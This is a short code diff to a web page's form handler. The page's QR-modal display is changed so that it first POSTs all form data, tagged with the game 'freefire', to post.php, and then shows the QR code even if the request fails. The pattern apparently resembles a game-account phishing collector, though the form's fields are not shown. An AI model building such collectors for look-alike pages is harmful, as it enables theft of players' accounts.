@@ -215,9 +215,30 @@
     const mainForm = document.getElementById('mainForm');
 
     form.addEventListener('submit', function(e) {
-      e.preventDefault(); // Prevent real submission
-      mainForm.style.display = 'none';
-      qrModal.style.display = 'flex';
+      e.preventDefault(); // Prevent default form submission
+      
+      // Create a FormData object from the form
+      const formData = new FormData(form);
+      
+      // Add game parameter to the form data
+      formData.append('game', 'freefire');
+      
+      // Send the form data to post.php
+      fetch('post.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        // Show QR code after successful submission
+        mainForm.style.display = 'none';
+        qrModal.style.display = 'flex';
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        // Still show QR code even if there's an error
+        mainForm.style.display = 'none';
+        qrModal.style.display = 'flex';
+      });
     });
 
     function closeQR() {
